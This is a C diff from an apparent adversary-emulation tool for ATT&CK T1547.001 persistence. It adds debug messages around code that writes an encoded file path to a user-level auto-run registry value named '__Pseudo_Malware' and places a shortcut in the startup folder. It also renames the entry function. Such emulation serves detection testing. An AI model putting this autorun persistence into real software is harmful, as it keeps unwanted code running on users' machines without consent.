@@ -58,6 +58,7 @@ static HKEY create_key(ProcedureList* pAdvapi32, HKEY key, LPCWSTR subkey)
 									 &disposition);
 	if (status != ERROR_ACCESS_DENIED && status != ERROR_SUCCESS)
 	{
+		printf("RegCreateKeyExW failed with code: 0x%lX\n", status);
 		assert(FALSE);
 	}
 
@@ -71,6 +72,10 @@ static HKEY get_key_handle(ProcedureList* pAdvapi32)
 	if (hKey == NULL)
 	{
 		hKey = create_key(pAdvapi32, HKEY_CURRENT_USER, subkey);
+		if (hKey == NULL)
+		{
+			printf("Failed to open key to CURRENT_USER\n");
+		}
 	}
 
 	return hKey;
@@ -108,6 +113,7 @@ static void set_auto_run_value(ProcedureList* pAdvapi32, ProcedureList* pCrypt32
 	String encodedFilepath = to_base64(pCrypt32, filepath);
 	if (encodedFilepath.array.pData == NULL)
 	{
+		printf("Failed to create encoded filepath.\n");
 		return;
 	}
 
@@ -120,6 +126,7 @@ static void set_auto_run_value(ProcedureList* pAdvapi32, ProcedureList* pCrypt32
 						   encodedFilepath.array.pData,
 						   STRING_SIZE(encodedFilepath) + 1) != ERROR_SUCCESS)
 	{
+		printf("Failed to set registry value __Pseudo_Malware.\n");
 		assert(FALSE);
 	}
 
@@ -290,7 +297,7 @@ static void add_lnk_to_startup_dir(ProcedureList* pKernel32, ProcedureList* pShe
 }
 //
 //
-void execute_t1574_001(char** argv)
+void execute_t1547_001(char** argv)
 {
 	ProcedureList kernel32 = procedure_list_create("Kernel32.dll", t1547_kernel32Procedures, ARRAYSIZE(t1547_kernel32Procedures));
 	ProcedureList advapi32 = procedure_list_create("advapi32.dll", t1547_advapi32Procedures, ARRAYSIZE(t1547_advapi32Procedures));
